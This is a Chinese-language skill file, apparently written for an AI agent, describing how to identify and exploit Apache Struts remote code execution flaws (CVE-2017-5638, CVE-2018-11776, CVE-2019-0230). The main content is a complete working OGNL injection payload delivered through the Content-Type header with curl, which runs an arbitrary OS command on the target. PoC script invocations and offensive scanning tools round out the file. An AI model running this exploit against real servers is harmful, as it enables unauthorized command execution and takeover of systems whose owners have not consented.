---
name: 'apache-struts-rce'
description: 'Apache Struts RCE：CVE-2017-5638/CVE-2018-11776 OGNL注入。IppSec2次提及，Java企业应用常见。'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## Apache Struts RCE

### 识别
- `.action` / `.do` URL 后缀
- `Struts` 在 HTTP 响应头或错误页面
- 开发模式泄露：`?debug=browser&object=com.opensymphony`

### CVE-2017-5638 (Struts 2.3.5-2.3.31, 2.5-2.5.10)
```bash
# Content-Type header OGNL 注入
curl -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" http://target/struts2-showcase/

# 或者用 PoC 脚本
python3 struts-poc.py -u http://target/struts2-showcase/ -c "id"
```

### CVE-2018-11776 (Struts 2.3-2.3.34, 2.5-2.5.16)
```bash
# namespace 重定向 OGNL 注入
python3 struts-poc.py -u http://target/struts2-showcase/ -c "id"
# 无 namespace 的 action → 自动利用
```

### CVE-2019-0230 (Struts 2.0.0-2.5.20)
```bash
# 强制 OGNL 双求值，需要 'inputtransfer' interceptor
```

### 通用检测
```bash
# nuclei 模板
nuclei -t cves/2021/CVE-2021-31805.yaml -u http://target/

# searchsploit
searchsploit struts 2
```

### 工具
- `Struts-Scan` (GitHub) 
- `struts-pwn` (GitHub)
- nmap: `nmap --script http-struts2-detect`
